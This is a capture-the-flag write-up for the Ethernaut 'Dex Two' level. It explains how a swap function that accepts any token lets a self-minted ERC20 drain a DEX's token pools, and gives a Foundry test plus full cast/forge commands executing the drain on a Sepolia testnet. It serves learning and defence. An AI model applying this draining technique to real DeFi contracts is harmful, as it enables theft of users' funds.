# Ethernaut Challenge 23 — Dex Two

This level asks you to break `DexTwo`, a modified version of the previous DEX contract.

You need to drain all balances of `token1` and `token2` from the `DexTwo` contract.

Initial setup:

* You:

  * 10 token1
  * 10 token2
* DEX:

  * 100 token1
  * 100 token2

---

## 🎯 Goal

Drain all tokens (`token1` and `token2`) from the `DexTwo` contract.

---

## 🔍 Key difference from previous level

The `DexTwo` contract is almost identical to the previous `Dex`, with one critical change.

This check has been **removed** from the `swap` function:

```solidity
require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");
```

---

## 🧠 Vulnerability analysis

Because this validation is missing:

* the DEX accepts **any ERC20 token** as `from`
* not only `token1` and `token2`

This is the core vulnerability.

---

### ⚠️ Why this is dangerous

The swap formula is:

```solidity
(amount * toBalance) / fromBalance
```

If we control `fromBalance`, we can manipulate the output.

---

## 💥 Exploit idea

We create a **malicious ERC20 token** and:

1. Mint a small amount to ourselves
2. Mint a small amount to the DEX
3. Use it as `from` in `swap`

Because:

```text
fromBalance (DEX) = 1
toBalance (DEX) = 100
```

We get:

```text
swapAmount = (1 * 100) / 1 = 100
```

💥 We receive all the tokens from the DEX.

---

## 🧪 Local test

This is implemented in [DexTwoTest.t.sol](../../test/DexTwoTest.t.sol)


We deploy two fake tokens:

* `myToken1`
* `myToken2`

Then:

```solidity
myToken1.mint(user, 1);
myToken1.mint(address(dex), 1);

myToken2.mint(user, 1);
myToken2.mint(address(dex), 1);
```

Then we perform:

```solidity
dex.swap(address(myToken1), address(token1), 1);
dex.swap(address(myToken2), address(token2), 1);
```

Final result:

```solidity
assertEq(token1.balanceOf(user), 110);
assertEq(token2.balanceOf(user), 110);

assertEq(token1.balanceOf(address(dex)), 0);
assertEq(token2.balanceOf(address(dex)), 0);
```

---

## 🚀 Exploit on Sepolia

### Step 0 — Setup

```bash
DEX_TWO_SEPOLIA=0x51Bc355E1c0093b61933508246Ea4ec01a9De71F
```

---

### Check `token1`

```bash
cast call $DEX_TWO_SEPOLIA \
    "token1()(address)" \
    --rpc-url $SEPOLIA_RPC_URL
```

Result:
`0xE2DBfC2CBf7cF2DBAE31971aa9dfFC1E154448A0`

```bash
TOKEN1_SEPOLIA=0xE2DBfC2CBf7cF2DBAE31971aa9dfFC1E154448A0
```

---

### Check `token2`

```bash
cast call $DEX_TWO_SEPOLIA \
    "token2()(address)" \
    --rpc-url $SEPOLIA_RPC_URL
```

Result:
`0xd21D5a9A351774a95C787d896ae969cCcb26e661`

```bash
TOKEN2_SEPOLIA=0xd21D5a9A351774a95C787d896ae969cCcb26e661
```

---

## 🧪 Step 1 — Deploy MyToken1

```bash
forge create src/challenge-23-dex-two/MyErc20.sol:MyErc20 \
  --rpc-url $SEPOLIA_RPC_URL \
  --account ethernaut \
  --broadcast 
```

MyToken1 deployed to:

```
0x00E01e159c3DDF43607dB9dB80563026cCd2AdBA
```

```bash
MY_TOKEN1_SEPOLIA=0x00E01e159c3DDF43607dB9dB80563026cCd2AdBA
```

---

### Mint tokens

```bash
MY_ADDRESS=0xeCF94300dD67bB8c31F41BE3a2136D3f0abFb0B0
```

Mint to yourself:

```bash
cast send $MY_TOKEN1_SEPOLIA \
    "mint(address,uint256)" \
    $MY_ADDRESS 1 \
    --rpc-url $SEPOLIA_RPC_URL \
    --account ethernaut
```

Check:

```bash
cast call $MY_TOKEN1_SEPOLIA \
    "balanceOf(address)(uint256)" \
    $MY_ADDRESS \
    --rpc-url $SEPOLIA_RPC_URL
```

Result: `1`

---

Mint to DEX:

```bash
cast send $MY_TOKEN1_SEPOLIA \
    "mint(address,uint256)" \
    $DEX_TWO_SEPOLIA 1 \
    --rpc-url $SEPOLIA_RPC_URL \
    --account ethernaut
```

Check:

```bash
cast call $MY_TOKEN1_SEPOLIA \
    "balanceOf(address)(uint256)" \
    $DEX_TWO_SEPOLIA \
    --rpc-url $SEPOLIA_RPC_URL
```

Result: `1`

---

## 🧪 Step 2 — Deploy MyToken2

```bash
forge create src/challenge-23-dex-two/MyErc20.sol:MyErc20 \
  --rpc-url $SEPOLIA_RPC_URL \
  --account ethernaut \
  --broadcast 
```

MyToken2 deployed to:

```
0x1F1B3C982EB3722096B1Af7Bb2ec8972A05A46a8
```

```bash
MY_TOKEN2_SEPOLIA=0x1F1B3C982EB3722096B1Af7Bb2ec8972A05A46a8
```

---

### Mint tokens

```bash
cast send $MY_TOKEN2_SEPOLIA \
    "mint(address,uint256)" \
    $MY_ADDRESS 1 \
    --rpc-url $SEPOLIA_RPC_URL \
    --account ethernaut
```

Check:

```bash
cast call $MY_TOKEN2_SEPOLIA \
    "balanceOf(address)(uint256)" \
    $MY_ADDRESS \
    --rpc-url $SEPOLIA_RPC_URL
```

Result: `1`

---

Mint to DEX:

```bash
cast send $MY_TOKEN2_SEPOLIA \
    "mint(address,uint256)" \
    $DEX_TWO_SEPOLIA 1 \
    --rpc-url $SEPOLIA_RPC_URL \
    --account ethernaut
```

Check:

```bash
cast call $MY_TOKEN2_SEPOLIA \
    "balanceOf(address)(uint256)" \
    $DEX_TWO_SEPOLIA \
    --rpc-url $SEPOLIA_RPC_URL
```

Result: `1`

---

## 💥 Step 3 — Execute the attack

### Swap using MyToken1

```bash
cast send $MY_TOKEN1_SEPOLIA \
    "approve(address,uint256)" \
    $DEX_TWO_SEPOLIA 1 \
    --rpc-url $SEPOLIA_RPC_URL \
    --account ethernaut
```

```bash
cast send $DEX_TWO_SEPOLIA \
    "swap(address,address,uint256)" \
    $MY_TOKEN1_SEPOLIA $TOKEN1_SEPOLIA 1 \
    --rpc-url $SEPOLIA_RPC_URL \
    --account ethernaut
```

---

### Swap using MyToken2

```bash
cast send $MY_TOKEN2_SEPOLIA \
    "approve(address,uint256)" \
    $DEX_TWO_SEPOLIA 1 \
    --rpc-url $SEPOLIA_RPC_URL \
    --account ethernaut
```

```bash
cast send $DEX_TWO_SEPOLIA \
    "swap(address,address,uint256)" \
    $MY_TOKEN2_SEPOLIA $TOKEN2_SEPOLIA 1 \
    --rpc-url $SEPOLIA_RPC_URL \
    --account ethernaut
```

---

## ✅ Final verification

```bash
cast call $TOKEN1_SEPOLIA \
    "balanceOf(address)(uint256)" \
    $MY_ADDRESS \
    --rpc-url $SEPOLIA_RPC_URL
```

Result: `110` ✅

```bash
cast call $TOKEN2_SEPOLIA \
    "balanceOf(address)(uint256)" \
    $MY_ADDRESS \
    --rpc-url $SEPOLIA_RPC_URL
```

Result: `110` ✅

```bash
cast call $TOKEN1_SEPOLIA \
    "balanceOf(address)(uint256)" \
    $DEX_TWO_SEPOLIA \
    --rpc-url $SEPOLIA_RPC_URL
```

Result: `0` ✅

```bash
cast call $TOKEN2_SEPOLIA \
    "balanceOf(address)(uint256)" \
    $DEX_TWO_SEPOLIA \
    --rpc-url $SEPOLIA_RPC_URL
```

Result: `0` ✅

---

## 🛡️ Security takeaway

* Never allow arbitrary tokens in a swap function
* Always validate supported assets
* Price formulas must not rely on manipulable inputs

